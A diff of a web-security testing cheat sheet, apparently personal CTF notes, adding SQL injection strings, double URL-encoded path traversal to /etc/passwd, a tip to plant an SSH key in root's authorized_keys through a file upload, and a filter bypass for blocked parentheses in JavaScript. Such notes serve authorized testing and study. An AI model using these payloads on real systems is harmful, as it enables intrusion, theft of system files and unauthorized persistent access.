@@ -27,24 +27,21 @@ The map file is a file that maps the minified code to the original code
 - You can find it with the static js files. It will be named the same as the js file with a .map at the end
 ## SQL Injection
 
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
 ```sql
 ' OR 1 = 1 UNION SELECT 1
 ```
 If error:
 - Try adding a limit to the amount of Rows
 - Try adding more columns
+- Check urlencoding
 
 ### sqlite3:
 get tables:
 ```sql
 ' UNION SELECT name, type FROM sqlite_master WHERE type='table'--
 ```
-#### If () are blocked:  
-```javascript
- `${console.log`test`}`
- //instead of
- console.log("test")
- ```
 ## API
 - Check OPTIONS verb
 - Try every verb
@@ -80,6 +77,18 @@ Useful to check:
 - Add ~ at the end of the php files
     - Vim backup files are stored with the file name + ~
 - /etc/apache2/sites-enabled/000-default or /etc/apache2/sites-available/default
+- if ../ is sanitized, try ....// or ....\/
+- may need to double urlencode 
+```
+ex:
+../../../etc/passwd
+↓
+%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+↓
+%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
+```
+If we can upload and choose the file name:
+- Add our public key to a user’s authorized_keys file (/root/.ssh/authorized_keys)
 ## XSS
 
 To try to intercept requests from the page:
@@ -197,3 +206,9 @@ session_save_path() to get the session save path
 ## Other
 - To dump the content of a directory from a website: `wget -r -np -nH --cut-dirs=3 -R index.html http://hostname/aaa/bbb/ccc/ddd/`
 - If we have command injection but can't easily exfiltrate the data, we can try to move the data in a file in the "public" directory. Then we can access it from the browser
+- If () are blocked:  
+```javascript
+ `${console.log`test`}`
+ //instead of
+ console.log("test")
+ ```
